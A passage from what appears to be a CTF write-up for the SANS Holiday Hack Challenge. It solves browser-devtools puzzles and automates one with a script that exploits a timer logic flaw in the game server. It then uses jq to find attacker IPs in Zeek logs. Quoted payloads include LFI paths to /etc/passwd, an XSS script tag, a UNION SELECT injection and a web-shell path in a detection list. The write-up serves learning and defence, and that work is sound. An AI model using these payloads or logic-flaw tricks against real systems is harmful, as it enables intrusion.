</li>

<li><a id="org6a86619"></a>Lock 7: Slick Font<br />
<div class="outline-text-5" id="text-org6a86619">
<p class="verse">
The font you're seeing is pretty slick, but this lock's code was my first pick.<br />
</p>

<div class="trailhint">
<p>
If we are, we should have a few fonts to choose from
</p>

</div>

<p>
We need to find the first font. The additional hint confirms this:
</p>

<div class="gamehint">
<p>
In the <code>font-family</code> css property, you can list multiple fonts, and the first available font on the system will be used.
</p>

</div>

<p>
Similar to how we solved the previous lock, we can inspect some of the
text, search the CSS style for <i>font</i>, and we find a code hidden as
a <code>font-family</code>.
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock7_solution.png" alt="lock7_solution.png" />
</p>
<p><span class="figure-number">Figure 75: </span>"You're not first anymore."</p>
</div>
</div>
</li>

<li><a id="org1503c39"></a>Lock 8: Bad Eggs<br />
<div class="outline-text-5" id="text-org1503c39">
<p class="verse">
In the event that the <code>.eggs</code> go bad, you must figure out who will be sad.<br />
</p>

<div class="trailhint">
<p>
The parents of spoiled kids go on the naughty list&#x2026;
</p>

</div>

<p>
We notice that <code>.eggs</code> is a different color, and we can <code>Inspect</code> that element. At first, nothing seems noteworthy. The additional hint points us in the right direction:
</p>

<div class="gamehint">
<p>
Google: "[your browser name] view event handlers"
</p>

</div>

<p>
When we look at the <code>Event Listeners</code> for that element, we see an event named <code>spoil</code>, which is referenced in the Trail hint. The handler makes <code>VERONICA</code> sad.
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock8_solution.png" alt="lock8_solution.png" />
</p>
<p><span class="figure-number">Figure 76: </span>"This is Jesus, Kent, and you've been a very naughty boy."</p>
</div>
</div>
</li>

<li><a id="org3139581"></a>Lock 9: Activating Chakras<br />
<div class="outline-text-5" id="text-org3139581">
<p class="verse">
This next code will be unredacted, but only when all the chakras are :active.<br />
</p>

<div class="trailhint">
<p>
Some toys have to be forced active
</p>

</div>

<p>
Looking closely at the instructions, we notice that there's an extra colon before "active":
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock9_clue.png" alt="lock9_clue.png" />
</p>
<p><span class="figure-number">Figure 77: </span>"I'm gonna have to push harder."</p>
</div>

<p>
The first additional hint is:
</p>

<div class="gamehint">
<p>
<code>:active</code> is a css pseudo class that is applied on elements in an active state.
</p>

</div>

<p>
A common example of activating an element is clicking on it, and we see that if we do this on certain words in the instructions, portions of the code appear. We can also force the state to be active, and see all chakras at once.
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock9_solution.png" alt="lock9_solution.png" />
</p>
<p><span class="figure-number">Figure 78: </span>"All I can tell you is it's rare and unstable."</p>
</div>
</div>
</li>

<li><a id="orga09fd49"></a>Lock 10: Gnome in Your Corbin<br />
<div class="outline-text-5" id="text-orga09fd49">
<p class="verse">
Oh, no! This lock's out of commission! Pop off the cover and locate what's missing.<br />
</p>

<div class="trailhint">
<p>
Sometimes when I'm working, I slide my hat to the left and move odd things onto my scalp!
</p>

</div>

<p>
The first hint is:
</p>

<div class="gamehint">
<p>
Use the DOM tree viewer to examine this lock. you can search for items in the DOM using this view.
</p>

</div>

<p>
If we inspect the entire lock, we see:
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #268bd2;">div</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"lock c10"</span>&gt;
  &lt;<span style="color: #268bd2;">div</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"cover"</span>&gt;
    &lt;<span style="color: #268bd2;">button</span> <span style="color: #dc322f;">data-id</span>=<span style="color: #859900;">"10"</span> <span style="color: #dc322f;">disabled</span>=<span style="color: #859900;">"disabled"</span>&gt;Unlock&lt;/<span style="color: #268bd2;">button</span>&gt;
  &lt;/<span style="color: #268bd2;">div</span>&gt;
  &lt;<span style="color: #268bd2;">input</span> <span style="color: #dc322f;">type</span>=<span style="color: #859900;">"text"</span> <span style="color: #dc322f;">maxlength</span>=<span style="color: #859900;">"8"</span> <span style="color: #dc322f;">data-id</span>=<span style="color: #859900;">"10"</span>&gt; 
  &lt;<span style="color: #268bd2;">button</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"switch"</span> <span style="color: #dc322f;">data-id</span>=<span style="color: #859900;">"10"</span>&gt;&lt;/<span style="color: #268bd2;">button</span>&gt; 
  &lt;<span style="color: #268bd2;">span</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"led-indicator locked"</span>&gt;&lt;/<span style="color: #268bd2;">span</span>&gt; 
  &lt;<span style="color: #268bd2;">span</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"led-indicator unlocked"</span>&gt;&lt;/<span style="color: #268bd2;">span</span>&gt;
&lt;/<span style="color: #268bd2;">div</span>&gt;
</pre>
</div>

<p>
We've found the cover that we're supposed to pop off, and the second hint tells us how:
</p>

<div class="gamehint">
<p>
You can click and drag elements to reposition them in the DOM tree.
</p>

</div>

<p>
We drag and drop (and delete) to end up with:
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #268bd2;">div</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"lock c10"</span>&gt;
  &lt;<span style="color: #268bd2;">button</span> <span style="color: #dc322f;">data-id</span>=<span style="color: #859900;">"10"</span> <span style="color: #dc322f;">disabled</span>=<span style="color: #859900;">"disabled"</span>&gt;Unlock&lt;/<span style="color: #268bd2;">button</span>&gt;
  &lt;<span style="color: #268bd2;">input</span> <span style="color: #dc322f;">type</span>=<span style="color: #859900;">"text"</span> <span style="color: #dc322f;">maxlength</span>=<span style="color: #859900;">"8"</span> <span style="color: #dc322f;">data-id</span>=<span style="color: #859900;">"10"</span>&gt; 
  &lt;<span style="color: #268bd2;">button</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"switch"</span> <span style="color: #dc322f;">data-id</span>=<span style="color: #859900;">"10"</span>&gt;&lt;/<span style="color: #268bd2;">button</span>&gt; 
  &lt;<span style="color: #268bd2;">span</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"led-indicator locked"</span>&gt;&lt;/<span style="color: #268bd2;">span</span>&gt; 
  &lt;<span style="color: #268bd2;">span</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"led-indicator unlocked"</span>&gt;&lt;/<span style="color: #268bd2;">span</span>&gt;
&lt;/<span style="color: #268bd2;">div</span>&gt;
</pre>
</div>

<p>
We try a code, but get no failure message. The third hint points us towards the <code>Console</code> if we don't get the desired effect, which tells us: <code>Error: Missing macaroni!</code>. We were told that we can search for elements in the DOM tree, and sure enough, we find <code>macaroni</code>, and move it into our lock, where it appears.
</p>

<p>
We repeat this process, finding the correct elements and moving them into the lock, until we end up with:
</p>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #268bd2;">div</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"lock c10"</span>&gt;
  &lt;<span style="color: #268bd2;">button</span> <span style="color: #dc322f;">data-id</span>=<span style="color: #859900;">"10"</span>&gt;Unlock&lt;/<span style="color: #268bd2;">button</span>&gt;
  &lt;<span style="color: #268bd2;">input</span> <span style="color: #dc322f;">type</span>=<span style="color: #859900;">"text"</span> <span style="color: #dc322f;">maxlength</span>=<span style="color: #859900;">"8"</span> <span style="color: #dc322f;">data-id</span>=<span style="color: #859900;">"10"</span>&gt; 
  &lt;<span style="color: #268bd2;">button</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"switch"</span> <span style="color: #dc322f;">data-id</span>=<span style="color: #859900;">"10"</span>&gt;&lt;/<span style="color: #268bd2;">button</span>&gt; 
  &lt;<span style="color: #268bd2;">span</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"led-indicator locked"</span>&gt;&lt;/<span style="color: #268bd2;">span</span>&gt; 
  &lt;<span style="color: #268bd2;">span</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"led-indicator unlocked"</span>&gt;&lt;/<span style="color: #268bd2;">span</span>&gt;
  &lt;<span style="color: #268bd2;">div</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"component macaroni"</span> <span style="color: #dc322f;">data-code</span>=<span style="color: #859900;">"A33"</span>&gt;&lt;/<span style="color: #268bd2;">div</span>&gt;
  &lt;<span style="color: #268bd2;">div</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"component swab"</span> <span style="color: #dc322f;">data-code</span>=<span style="color: #859900;">"J39"</span>&gt;&lt;/<span style="color: #268bd2;">div</span>&gt;
  &lt;<span style="color: #268bd2;">div</span> <span style="color: #dc322f;">class</span>=<span style="color: #859900;">"component gnome"</span> <span style="color: #dc322f;">data-code</span>=<span style="color: #859900;">"XJ0"</span>&gt;&lt;/<span style="color: #268bd2;">div</span>&gt;
&lt;/<span style="color: #268bd2;">div</span>&gt;
</pre>
</div>

<p>
The last hint ("Be sure to examine that printed circuit board.") helps us find the code, which is hidden on the bottom right:
</p>


<div class="figure">
<p><img src="./imgs/obj_11/lock10_solution.png" alt="lock10_solution.png" />
</p>
<p><span class="figure-number">Figure 79: </span>"Unlock the bird's-eye."</p>
</div>

<p>
Once we unlock the last lock, we see:
</p>


<div class="figure">
<p><img src="./imgs/obj_11/solution_casual.png" alt="solution_casual.png" />
</p>
<p><span class="figure-number">Figure 80: </span>"It should have gone further, faster."</p>
</div>

<p>
We've solved the challenge, and identified the villain!
</p>
</div>
</li>
</ul>
</div>

<div id="outline-container-orgdd77782" class="outline-4">
<h4 id="orgdd77782">Automating the Solution: &lt; 1s</h4>
<div class="outline-text-4" id="text-orgdd77782">
<p>
Observing the HTTP response from opening the crate, we see:
</p>

<blockquote>
<p>
Well done! Do you have what it takes to Crack the Crate in under three minutes?
</p>
</blockquote>

<p>
Now that we know the drill, we're able to improve our time, just to see another challenge:
</p>


<div class="figure">
<p><img src="./imgs/obj_11/solution_quickness.png" alt="solution_quickness.png" />
</p>
<p><span class="figure-number">Figure 81: </span>"Is something wrong with the test scores?"</p>
</div>

<blockquote>
<p>
Very impressive!! But can you Crack the Crate in less than five seconds?
</p>
</blockquote>

<p>
Five seconds is a tall order. At that point, we can't do it manually, and must use automation. We start studying the locks further, and design a plan. The codes are hidden across 4 resources:
</p>

<ol class="org-ol">
<li>The HTML page (print media, title, hologram, and font)</li>
<li>The stylesheet (chakras)</li>
<li>The javascript (console, local storage)</li>
<li>The image</li>
</ol>

<p>
Additionally, locks 8 and 10 (spoiled eggs and broken lock) always have the same codes.
</p>

<p>
The codes are discovered as follows:
</p>

<ol class="org-ol">
<li>The value printed to the console follows <code>%c▋</code>, after base64 and then hex-encoding it. We search client.js for that string, then extract our code.</li>
<li>Using <a href="https://www.crummy.com/software/BeautifulSoup/">BeautifulSoup</a> to parse the HTML: <code>soup.find("div", {'class' : 'libra'}).find('strong')</code></li>
<li>We use <a href="https://github.com/madmaze/pytesseract">PyTesseract</a> to OCR the iamge: <code>pytesseract.image_to_string(Image.open(BytesIO(s.get('https://' + domain + '/images/%s.png' % token).content)))</code></li>
<li>Search the Javascript for the base64-encoded version of the barrels (🛢️🛢️🛢️), and extract the string.</li>
<li>Last 8 of the title, <code>soup.find('title').decode_contents()[-8:]</code></li>
<li>The characters in the hologram are always in the same order <code>[3, 0, 4, 6, 5, 2, 7, 1]</code>. Use BeautifulSoup to extract the characters: <code>soup.find("div", {'class': 'hologram'}).find('div').children</code></li>
<li>Find the style, and extract the code: <code>soup.find('style').decode_contents().split("'")[1]</code></li>
<li><code>VERONICA</code></li>
<li>Parse the CSS, with something like: <code>if line.startswith("  content:"): result += line.split("'")[1]</code>.</li>
<li><code>KD29XJ37</code></li>
</ol>

<p>
With this script, we're able to complete it in a couple hundred milliseconds:
</p>


<div class="figure">
<p><img src="./imgs/obj_11/solution_ludicrous.jpg" alt="solution_ludicrous.jpg" />
</p>
<p><span class="figure-number">Figure 82: </span>You are a Crate Cracking Master! This is our highest rank. A building will be named in your honor, probably.</p>
</div>
</div>
</div>

<div id="outline-container-org7d19d85" class="outline-4">
<h4 id="org7d19d85">Improving our Speed: &lt;100 ms</h4>
<div class="outline-text-4" id="text-org7d19d85">
<p>
At this point, we do a few iterations of optimization on our code.
</p>

<p>
To minimize network latency, we use a Google Compute instance in the same GCE zone.
</p>

<p>
We're using the Python Requests library, and switch to <a href="https://requests.readthedocs.io/en/master/user/advanced/#session-objects">Session Objects</a>, which will persist the same HTTP connection across multiple requests.
</p>

<p>
To improve SSL performance, we <a href="https://stackoverflow.com/a/46186957">force the use</a> of <code>ECDH+AES256</code>, which should be the fastest option offered by the server.
</p>

<p>
At this point, most of the execution time is within our Python
code. We have several requests back and forth to the server, so we
introduce artificial delays at each step, and run a few tests to
determine when exactly the server thinks that we started and stopped
our attempt. We discover that we only start the attempt upon
downloading the Javascript file, so we move to performing everything
except for locks 1 and 4 first, fetching the Javascript, and then
submitting our answers. Most importantly, our OCR no longer counts
against us, as this was the biggest contributor.
</p>

<p>
We downloaded the Javascript file 1000 times, and noticed that roughly
3% of the time, we received a file that was the same size. In these
files, the offsets of the codes to the locks were at consistent
locations. So, we changed our code to only make an attempt when the JS
file was of this size, using the specific offsets, and avoid two
operations that search the contents of the file.
</p>

<p>
The final steps we take to improve the performance are to use the
Python multiprocessing module to parallelize our requests to unlock
locks 1 and 4, and to compile our code via <a href="https://cython.readthedocs.io/en/latest/src/tutorial/cython_tutorial.html">Cython</a>.
</p>

<p>
After all this, we're able to drop under the 100ms mark:
</p>


<div class="figure">
<p><img src="./imgs/obj_11/solution_optimization.jpg" alt="solution_optimization.jpg" />
</p>
</div>

<p>
At this point, our automated solution runs almost 4 times faster than our initial attempt.
</p>
</div>
</div>

<div id="outline-container-orgf4f6dbc" class="outline-4">
<h4 id="term_crate_score"><a id="orgf4f6dbc"></a>Cheating to Achieve 7ms</h4>
<div class="outline-text-4" id="text-term_crate_score">
<p>
After all this work, we identified a logic error in the code which
made it much easier. It turns out that we only needed to solve one
lock, and not all 10. Our final code looks like this:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #586e75;">#</span><span style="color: #657b83;">!/usr/bin/env python3</span>

<span style="color: #6c71c4;">from</span> multiprocessing <span style="color: #6c71c4;">import</span> Barrier, Process
<span style="color: #6c71c4;">import</span> requests
<span style="color: #6c71c4;">import</span> uuid

<span style="color: #dc322f;">domain</span> = <span style="color: #859900;">'sleighworkshopdoor.elfu.org'</span>

<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">start</span>(seed, synchronizer):
    <span style="color: #839496;">"""Download the Javascript to start our timer."""</span>

    <span style="color: #dc322f;">s</span> = requests.Session()

    <span style="color: #586e75;"># </span><span style="color: #657b83;">Wait for the other function</span>
    synchronizer.wait()

    <span style="color: #586e75;"># </span><span style="color: #657b83;">HEAD request because we don't actually need the contents</span>
    s.head(<span style="color: #859900;">'https://'</span> + domain + <span style="color: #859900;">'/client.js/'</span> + seed)

<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">stop</span>(seed, synchronizer):
    <span style="color: #839496;">"""Submit our answer to stop the timer."""</span>

    <span style="color: #dc322f;">data</span> = {<span style="color: #859900;">'seed'</span>: seed, <span style="color: #859900;">'codes'</span>: {<span style="color: #859900;">'8'</span>: <span style="color: #859900;">"VERONICA"</span>}}

    <span style="color: #dc322f;">s</span> = requests.Session()

    <span style="color: #586e75;"># </span><span style="color: #657b83;">Wait for the other function</span>
    synchronizer.wait()

    <span style="color: #dc322f;">result</span> = s.post(<span style="color: #859900;">'https://'</span> + domain + <span style="color: #859900;">'/open'</span>, json=data)
    <span style="color: #6c71c4;">print</span>(result.content)

<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">main</span>():
    <span style="color: #586e75;"># </span><span style="color: #657b83;">Pick a random UUID</span>
    <span style="color: #dc322f;">seed</span> = <span style="color: #2aa198;">str</span>(uuid.uuid4())

    <span style="color: #586e75;"># </span><span style="color: #657b83;">Run start and stop, simultaneously</span>
    <span style="color: #dc322f;">synchronizer</span> = Barrier(2)
    Process(target=start, args=(seed, synchronizer)).start()
    Process(target=stop, args=(seed, synchronizer)).start()

    <span style="color: #6c71c4;">print</span>(<span style="color: #859900;">"Image is at https://"</span> + domain + <span style="color: #859900;">"/images/scores/"</span> + seed + <span style="color: #859900;">".jpg"</span>)


<span style="color: #6c71c4;">if</span> <span style="color: #2aa198;">__name__</span> == <span style="color: #859900;">'__main__'</span>:
    main()
</pre>
</div>

<p>
This function attempts to start and stop the timer as close together
as possible. We only submit the value of one of the locks, and it's
one that always stays the same, so no computation is needed.
</p>


<div class="figure">
<p><img src="./imgs/obj_11/solution_best.jpg" alt="solution_best.jpg" />
</p>
<p><span class="figure-number">Figure 84: </span>"Mitch beat your scores by 20 points."</p>
</div>
</div>
</div>

<div id="outline-container-org25d4e07" class="outline-4">
<h4 id="term_crate_cracking"><a id="org25d4e07"></a>Bonus: Cracking the Code</h4>
<div class="outline-text-4" id="text-term_crate_cracking">
<p>
Early on, we noticed this commented-out Javascript snippet when visiting <a href="https://sleighworkshopdoor.elfu.org">https://sleighworkshopdoor.elfu.org</a>:
</p>

<div class="org-src-container">
<pre class="src src-javascript"><span style="color: #6c71c4;">const</span> <span style="color: #dc322f;">getTestFlag</span> = seed =&gt; {
    <span style="color: #6c71c4;">const</span> <span style="color: #dc322f;">chance</span> = <span style="color: #6c71c4;">new</span> <span style="color: #b58900;">Chance</span>(seed);
    chance.string({
        length: 8,
        pool: <span style="color: #859900;">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>,
    });
}
</pre>
</div>

<p>
We were confused as to why this was here, and thought that maybe it
was left over from testing the challenge. Later on, we realized that
by supplying the UUID as the seed, this snippet would generate the
code in the image that was fetched but never shown.
</p>

<p>
We knew that to validate a certain code, we needed to supply the
server the UUID, and which lock the code was for. We thought it likely
that the <code>getTestFlag</code> function was used for the other codes, just
with a different seed. We also thought it likely that those seeds were
tied to the UUID, as everything in this challenge seemed to stem from
the one UUID.
</p>

<p>
We wrote a script to brute-force the seed. We manually solved the
challenge, and presented the valid codes and UUID to the script. After
about 20 seconds, we saw:
</p>

<pre class="src">
<span class="gray1">$</span> <span class="green">node</span> token_brute.js
Found seed for QO27M4Q2 (lock 3) 7b5a647b-1b41-4973-bc38-4472c3ee484a
Found seed for YP68TGPC (lock 4) 7b5a647b-1b41-4973-bc38-4472c3ee484a_ls
Found seed for QSE47ABU (lock 7) 7b5a647b-1b41-4973-bc38-4472c3ee484a_font
</pre>

<p>
Success! We let it run for another hour, and didn't get anywhere,
though. But, we could easily identify a pattern, and it was time to
refine our search.
</p>

<p>
We expanded all the hints, and saved the crate webpage, then used
<code>grep</code> to generate a wordlist: <code>egrep -o '[a-zA-Z]+' crate.html | sort | uniq &gt; wordlist</code>. 
A script that iterated through this list was able to find the 
other seeds almost immediately:
</p>

<pre class="src">
<span class="gray1">$</span> <span class="green">node</span> token_wordlist.js
Found seed for D6OQJZLR (lock 9) 7b5a647b-1b41-4973-bc38-4472c3ee484a_chakras
Found seed for F0STIHB8 (lock 1) 7b5a647b-1b41-4973-bc38-4472c3ee484a_console
Found seed for 7S4L7YC1 (lock 6) 7b5a647b-1b41-4973-bc38-4472c3ee484a_hologram
Found seed for U7VX636E (lock 2) 7b5a647b-1b41-4973-bc38-4472c3ee484a_print
Found seed for XVK9EIF5 (lock 5) 7b5a647b-1b41-4973-bc38-4472c3ee484a_title
</pre>
</div>
</div>
</div>
<div id="outline-container-orge420c24" class="outline-3">
<h3 id="obj12"><a id="orge420c24"></a>12. Filter Out Poisoned Sources of Weather Data 🎄🎄🎄🎄</h3>
<div class="outline-text-3" id="text-obj12">
</div>
<div id="outline-container-org043a4fc" class="outline-4">
<h4 id="org043a4fc">Background</h4>
<div class="outline-text-4" id="text-org043a4fc">
<p>
Use the data supplied in the Zeek JSON logs to identify the IP
addresses of attackers poisoning Santa's flight mapping
software. Submit the Route ID ("RID") success value that you're
given.
</p>

<div class="goal">
<p>
Block the 100 offending sources of information to guide
Santa's sleigh through the attack. 
</p>

</div>

<div class="chat">
<p>
You see, Santa's flight route is planned by a complex set of machine learning algorithms which use available weather data.
</p>

<p>
All the weather stations are reporting severe weather to Santa's Sleigh. I think someone might be forging intentionally false weather data!
</p>

<p>
I'm so flummoxed I can't even remember how to login!
</p>

<p>
Hmm&#x2026; Maybe the Zeek http.log could help us.
</p>

<p>
I worry about LFI, XSS, and SQLi in the Zeek log - oh my!
</p>

<p>
And I'd be shocked if there weren't some shell stuff in there too.
</p>

<p>
I'll bet if you pick through, you can find some naughty data from naughty hosts and block it in the firewall.
</p>

<p>
If you find a log entry that definitely looks bad, try pivoting off other unusual attributes in that entry to find more bad IPs.
</p>

<p>
The sleigh's machine learning device (SRF) needs most of the malicious IPs blocked in order to calculate a good route.
</p>

<p>
Try not to block many legitimate weather station IPs as that could also cause route calculation failure.
</p>

<p>
Remember, when looking at JSON data, <code>jq</code> is the tool for you!
</p>

</div>

<div class="gamehint">
<p>
<i>For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.</i>
</p>

<p>
<b>Finding Bad in Web Logs</b>: Do you see any <a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">LFI</a>, <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">XSS</a>, <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">Shellshock</a>, or <a href="https://www.owasp.org/index.php/SQL_Injection">SQLi</a>?
</p>

<p>
<b>Data Correlation</b>: Take known nasty sources and look at their supporting characteristics to grow your insights into other bad sources used by attackers.
</p>

<p>
<b>Jq Functions</b>: JQ supports many functions for analysis, including <code>test</code>, <code>select</code>, and <code>contains</code>. <a href="https://stedolan.github.io/jq/manual/#Builtinoperatorsandfunctions">Use these functions to your advantage</a>!
</p>

</div>
</div>
</div>

<div id="outline-container-orgf7427b1" class="outline-4">
<h4 id="orgf7427b1">Solution</h4>
<div class="outline-text-4" id="text-orgf7427b1">
<p>
According to the objective, we need to identify the bad IPs and then
block those using the firewall. Clearly we need access to the SRF
server and there may be more clues within so that will be our initial
focus. The intro to the <a href="#term_iptables">iptables terminal</a> told us:
</p>

<blockquote>
<p>
Kent TinselTooth: Please no, they're testing it at srf.elfu.org using default creds, but I don't know more. It's classified.
</p>
</blockquote>

<p>
Also, recall from <a href="#post_decryption">Objective 10</a> we decrypted a secret PDF.
 Contained in that document are a ton of details about the
 Sled-O-Matic, but also the following line:
</p>

<blockquote>
<p>
The default login credentials should be changed on startup and can be found in the readme in the ElfU Research Labs git repository.
</p>
</blockquote>

<p>
There's no git server that we can find, but perhaps we can get lucky. In the http.log, we notice a successful request for README.md, and find <a href="https://srf.elfu.org/README.md">https://srf.elfu.org/README.md</a>. Contained within are the exceptionally good default credentials to SRF:  
</p>

<p>
<code>admin 924158F9522B3744F5FCD4D10FAC4356</code>
</p>

<p>
Not only do we have access to the required firewall, but we have API documentations as well. Unfortunately, the current weather map makes it clear the climate change is real and we should all be very concerned.
</p>

<p>
Similar to the previous termimal challenge, we use <code>jq</code> to parse the JSON log format:
</p>

<pre class="src">
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.uri|test("README.md")) | .uri,.["id.orig_h"],.user_agent,.status_code'</span>
 "/README.md"
 "42.103.246.130"
 "Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)"
 200
</pre>

<p>
There are a couple things of note here. The most concerning is that someone else potentially obtained the same default credentials we did. Secondly, the <code>user_agent</code> has "MSIe" with the wrong capitalization. 
</p>

<p>
Let's look at what else that src IP did:
</p>

<pre class="src">
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.["id.orig_h"]|test("42.103.246.130")) | .uri,.status_code'</span>
 "/README.md"
 200
 "/api/login"
 200
 "/home.html"
 200
 "/.git/HEAD"
 404
</pre>

<p>
Uh oh. README.md -&gt; /api/login -&gt; home.html. That's almost
certainly a bad actor. A normal user going to the SRF portal would
download the index which also grabs the title image, css, and
javascript files. Going directly from the README file to the
/api/login endpoint is very suspicious. Given the incorrect
<code>user_agent</code>, we can pivot on that as well:
</p>

<pre class="src">
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">"/api/weather?station_id=1' UNION SELECT NULL,NULL,NULL--"</span>
 200
 "/README.md"
 200
 --8<--snip--8<--
</pre>


<p>
Looks like they tried an SQL injection as well. If this were a real incident investigation we might consider this to be the attacker's originating IP when they were manually probing the system.
</p>

<p>
While poking around at the logs we took a few notes of patterns that might be interesting later. We also noted that odd things only appeared in <code>uri</code>, <code>user-agent</code>, and <code>host</code> fields.
</p>
<pre class="example">
/etc/passwd
SELECT
UNION
&lt;script&gt;
ssrf
login.cgi
gitweb
-r nessus
/cgi-bin/c99shell.php
bash
</pre>

<p>
This was a tricky objective. We tend to be more agressive with our definition of what's bad. For example, if we look at just potential scanners looking for .php files we get 1699 IPs. We know from the objective that we're only looking for 100.
</p>

<p>
Going back to the instructions we reduce our concept of 'bad' and focus only on the four types of attacks (LFI, XSS, Shellshock, SQLi).
</p>
</div>
</div>

<div id="outline-container-org774f714" class="outline-4">
<h4 id="org774f714">Local File Inclusion (LFI)</h4>
<div class="outline-text-4" id="text-org774f714">
<p>
Looking for Local File Inclusion (LFI) first, we search for "../" in the <code>uri</code> as a classic identifier for LFI attempts.
</p>

<pre class="src src-sh">
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.uri|test("\\.\\./")) | .uri'</span>
</pre>

<p>
This gives four results that all refer to 'etc/passwd.'  Given how common that might be as a target file, we'll shift slightly and look for 'etc/passwd' instead:
</p>

<pre class="src src-sh">
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.uri|test("etc/passwd")) | .uri'</span>
</pre>

<p>
Excellent, 11 results this time.
</p>
</div>
</div>

<div id="outline-container-orgca41a14" class="outline-4">
<h4 id="orgca41a14">Cross-Site Scripting (XSS)</h4>
<div class="outline-text-4" id="text-orgca41a14">
<p>
For XSS, we look for the existence of "&lt;script" in the <code>uri</code>, but we also found a few in the <code>host</code> field
</p>

<pre class="src src-sh">
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.uri|test("&lt;script")) | .["id.orig_h"],.uri'</span>
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.host|test("&lt;script")) | .["id.orig_h"],.host'</span>
</pre>

<p>
Between the two we get 16 more IPs we can classify as bad.
</p>
</div>
</div>

<div id="outline-container-org0178955" class="outline-4">
<h4 id="org0178955">Shellshock</h4>
<div class="outline-text-4" id="text-org0178955">
<p>
The Shellshock attack was an attempt to inject shell commands into HTTP headers. We started poking around with searches for 'bash' or 'bin/sh'. In the end we settled on 'bin/' as it seems to find all six IPs we've identified attempting Shellshock. 
</p>

<pre class="src src-sh">
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.user_agent|test("bin/")) | .["id.orig_h"],.user_agent'</span>
</pre>

<p>
That's 6 more.
</p>
</div>
</div>

<div id="outline-container-orgb4401b7" class="outline-4">
<h4 id="orgb4401b7">SQL Injection (SQLi)</h4>
<div class="outline-text-4" id="text-orgb4401b7">
<p>
Looking for SQLi was fairly straightforward and returned the biggest number of results for attacker IPs. We found 'SELECT' in both the <code>user_agent</code> and <code>uri</code> fields:
</p>

<pre class="src src-sh">
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.uri|test("SELECT")) | .["id.orig_h"]'</span> | <span class="green">wc</span> -<span class="purple">l</span>
      16
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.user_agent|test("SELECT")) | .["id.orig_h"]'</span> | <span class="green">wc</span> -<span class="purple">l</span>
       9
</pre>

<p>
There were also several examples with lowercase 'select' and 'Select' but these were not injection attempts.
</p>

<p>
With these 25, our total number of attacking IPs is 58. 
</p>
</div>
</div>

<div id="outline-container-orgeaa085e" class="outline-4">
<h4 id="orgeaa085e">Pivoting on Other Fields</h4>
<div class="outline-text-4" id="text-orgeaa085e">
<p>
Wunhorse gave us the following hint:
</p>

<div class="chat">
<p>
Take known nasty sources and look at their supporting characteristics to grow your insights into other bad sources used by attackers.
</p>

</div>

<p>
Looking at a few of our bad IPs and all of the fields in those logs entries, the first thing that stands out is the <code>user_agent</code> fields:
</p>

<pre class="src src-sh">
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.["id.orig_h"]=="84.147.231.129") |.uri,.user_agent'</span>
 "/api/weather?station_id=&lt;script>alert('automatedscanning');&lt;/script>"
 "Mozilla/4.0 (compatible; Metasploit RSPEC)"

<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.["id.orig_h"]=="187.178.169.123") |.uri,.user_agent'</span>
 "/api/login?id=/../../../../../../../../../etc/passwd"
 "Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)"

<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.["id.orig_h"]=="9.206.212.33") |.uri,.user_agent'</span>
 "/api/weather?station_id=/etc/passwd"
 "Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1"
</pre>

<p>
"<a href="https://www.metasploit.com/">Metasploit</a>" is obviously suspicious, but the other two examples are a bit more subtle with their misspellings: "MSSIE" and "MSIE 666.0."  Recall we were also able to pivot on the <code>user_agent</code> of the original attacker IP, so this looks promising.
</p>

<pre class="src src-sh">
